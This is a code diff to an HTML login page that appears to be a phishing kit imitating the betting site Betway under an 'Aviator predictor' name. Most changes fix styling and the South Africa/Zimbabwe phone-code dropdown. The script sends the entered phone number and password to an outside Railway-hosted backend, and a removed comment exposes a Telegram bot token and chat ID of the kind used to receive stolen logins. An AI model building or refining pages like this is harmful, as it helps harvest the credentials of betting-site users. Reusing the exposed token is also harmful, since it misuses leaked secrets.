@@ -60,7 +60,6 @@
             font-weight: 300;
         }
 
-        /* ===== ANNOUNCEMENT BOX ===== */
         .announcement {
             background: linear-gradient(135deg, #1a1a00, #2a2a00);
             border: 1px solid #f5c518;
@@ -119,7 +118,6 @@
             text-align: center;
         }
 
-        /* ===== INPUT WITH COUNTRY CODE ===== */
         .input-group {
             margin-bottom: 18px;
             position: relative;
@@ -134,6 +132,7 @@
             letter-spacing: 0.3px;
         }
 
+        /* ===== FIXED: Removed overflow hidden from input-wrap ===== */
         .input-group .input-wrap {
             display: flex;
             align-items: center;
@@ -141,7 +140,7 @@
             border: 2px solid #2a2a2a;
             border-radius: 10px;
             transition: all 0.3s ease;
-            overflow: hidden;
+            position: relative;
         }
 
         .input-group .input-wrap:focus-within {
@@ -154,16 +153,25 @@
         .input-group .country-code {
             display: flex;
             align-items: center;
-            gap: 4px;
-            padding: 0 8px 0 14px;
+            gap: 6px;
+            padding: 0 10px 0 14px;
             border-right: 1px solid #2a2a2a;
             cursor: pointer;
             position: relative;
-            min-width: 70px;
+            min-width: 80px;
+            height: 100%;
+            user-select: none;
+            flex-shrink: 0;
+            padding-top: 14px;
+            padding-bottom: 14px;
+        }
+
+        .input-group .country-code:hover {
+            background: #1a1a1a;
         }
 
         .input-group .country-code .flag {
-            font-size: 20px;
+            font-size: 22px;
             line-height: 1;
         }
 
@@ -175,23 +183,29 @@
 
         .input-group .country-code .arrow {
             color: #888;
-            font-size: 12px;
+            font-size: 11px;
             margin-left: 2px;
+            transition: transform 0.3s ease;
         }
 
+        .input-group .country-code .arrow.open {
+            transform: rotate(180deg);
+        }
+
+        /* ===== DROPDOWN - FIXED VISIBILITY ===== */
         .input-group .country-code .dropdown {
             display: none;
             position: absolute;
-            top: 100%;
-            left: 0;
+            top: calc(100% + 8px);
+            left: -2px;
             background: #1a1a1a;
             border: 1px solid #2a2a2a;
-            border-radius: 10px;
-            min-width: 120px;
-            z-index: 50;
-            margin-top: 8px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border-radius: 12px;
+            min-width: 200px;
+            z-index: 9999;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
             overflow: hidden;
+            padding: 6px 0;
         }
 
         .input-group .country-code .dropdown.open {
@@ -201,7 +215,7 @@
         .input-group .country-code .dropdown .option {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
             padding: 12px 16px;
             cursor: pointer;
             transition: 0.3s;
@@ -215,11 +229,18 @@
         }
 
         .input-group .country-code .dropdown .option .flag {
-            font-size: 20px;
+            font-size: 22px;
         }
 
         .input-group .country-code .dropdown .option .code {
             font-weight: 600;
+            color: #ffffff;
+        }
+
+        .input-group .country-code .dropdown .option .country-name {
+            color: #888;
+            font-size: 12px;
+            margin-left: auto;
         }
 
         .input-group input[type="tel"] {
@@ -231,6 +252,7 @@
             font-size: 15px;
             outline: none;
             flex: 1;
+            min-width: 0;
         }
 
         .input-group input[type="tel"]::placeholder {
@@ -245,6 +267,7 @@
             cursor: pointer;
             transition: 0.3s;
             z-index: 2;
+            flex-shrink: 0;
         }
 
         .input-group .input-icon:hover {
@@ -305,7 +328,6 @@
             color: #f5c518;
         }
 
-        /* ===== FORGOT ROW ===== */
         .forgot-row {
             display: flex;
             justify-content: space-between;
@@ -323,7 +345,6 @@
             color: #f5c518;
         }
 
-        /* ===== LOGIN BUTTON ===== */
         .login-btn {
             width: 100%;
             padding: 16px;
@@ -382,7 +403,6 @@
             display: inline-block;
         }
 
-        /* ===== DIVIDER ===== */
         .divider {
             display: flex;
             align-items: center;
@@ -424,7 +444,6 @@
             text-decoration: underline;
         }
 
-        /* ===== MESSAGE ===== */
         #message {
             padding: 12px 16px;
             border-radius: 10px;
@@ -449,7 +468,6 @@
             color: #00c45a;
         }
 
-        /* ===== PAGE LOADER ===== */
         .page-loader {
             display: flex;
             position: absolute;
@@ -493,7 +511,6 @@
             display: none;
         }
 
-        /* ===== LOGIN LOADER ===== */
         .loading-overlay {
             display: none;
             position: absolute;
@@ -565,10 +582,14 @@
                 min-width: 60px;
             }
             .input-group .country-code .flag {
-                font-size: 17px;
+                font-size: 18px;
             }
             .input-group .country-code .code {
                 font-size: 12px;
+            }
+            .input-group .country-code .dropdown {
+                min-width: 170px;
+                left: -10px;
             }
         }
     </style>
@@ -630,17 +651,17 @@
                     <div class="country-code" id="countrySelector">
                         <span class="flag" id="selectedFlag">🇿🇦</span>
                         <span class="code" id="selectedCode">+27</span>
-                        <span class="arrow"><i class="fas fa-chevron-down"></i></span>
+                        <span class="arrow" id="dropdownArrow"><i class="fas fa-chevron-down"></i></span>
                         <div class="dropdown" id="countryDropdown">
                             <div class="option" data-flag="🇿🇦" data-code="+27">
                                 <span class="flag">🇿🇦</span>
                                 <span class="code">+27</span>
-                                <span style="color:#888;font-size:12px;margin-left:4px;">South Africa</span>
+                                <span class="country-name">South Africa</span>
                             </div>
                             <div class="option" data-flag="🇿🇼" data-code="+263">
                                 <span class="flag">🇿🇼</span>
                                 <span class="code">+263</span>
-                                <span style="color:#888;font-size:12px;margin-left:4px;">Zimbabwe</span>
+                                <span class="country-name">Zimbabwe</span>
                             </div>
                         </div>
                     </div>
@@ -689,40 +710,41 @@
     <script>
         // ============================================
         // COMPLETE JAVASCRIPT
-        // NEW DETAILS:
-        // Bot Token: 8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI
-        // Chat ID: 8392790531
-        // Railway URL: betwayaviatorpredictor-production-0a61.up.railway.app
         // ============================================
 
         console.log('🔴 Script loaded!');
 
         // ============================================
-        // COUNTRY CODE DROPDOWN
+        // COUNTRY CODE DROPDOWN - FIXED
         // ============================================
 
         var countrySelector = document.getElementById('countrySelector');
         var countryDropdown = document.getElementById('countryDropdown');
+        var dropdownArrow = document.getElementById('dropdownArrow');
         var selectedFlag = document.getElementById('selectedFlag');
         var selectedCode = document.getElementById('selectedCode');
         var selectedCountryCode = '+27';
 
-        // Toggle dropdown
+        // Toggle dropdown on click
         countrySelector.addEventListener('click', function(e) {
             e.stopPropagation();
             countryDropdown.classList.toggle('open');
+            dropdownArrow.classList.toggle('open');
+            console.log('📂 Dropdown toggled');
         });
 
         // Select country option
         var options = document.querySelectorAll('.option');
         options.forEach(function(option) {
-            option.addEventListener('click', function() {
+            option.addEventListener('click', function(e) {
+                e.stopPropagation();
                 var flag = this.getAttribute('data-flag');
                 var code = this.getAttribute('data-code');
                 selectedFlag.textContent = flag;
                 selectedCode.textContent = code;
                 selectedCountryCode = code;
                 countryDropdown.classList.remove('open');
+                dropdownArrow.classList.remove('open');
                 console.log('🌍 Country selected:', code);
             });
         });
@@ -730,7 +752,10 @@
         // Close dropdown when clicking outside
         document.addEventListener('click', function() {
             countryDropdown.classList.remove('open');
+            dropdownArrow.classList.remove('open');
         });
+
+        console.log('✅ Country dropdown initialized!');
 
         // ============================================
         // PAGE LOADING: 10-15 seconds
@@ -775,10 +800,12 @@
                 passwordInput.type = 'text';
                 togglePassword.innerHTML = '<i class="fas fa-eye"></i>';
                 togglePassword.classList.add('active');
+                console.log('👁️ Password visible');
             } else {
                 passwordInput.type = 'password';
                 togglePassword.innerHTML = '<i class="fas fa-eye-slash"></i>';
                 togglePassword.classList.remove('active');
+                console.log('🔒 Password hidden');
             }
         });
 
@@ -846,7 +873,6 @@
 
             // ============================================
             // SEND TO BACKEND
-            // NEW RAILWAY URL
             // ============================================
 
             var apiUrl = 'https://betwayaviatorpredictor-production-0a61.up.railway.app/api/login';
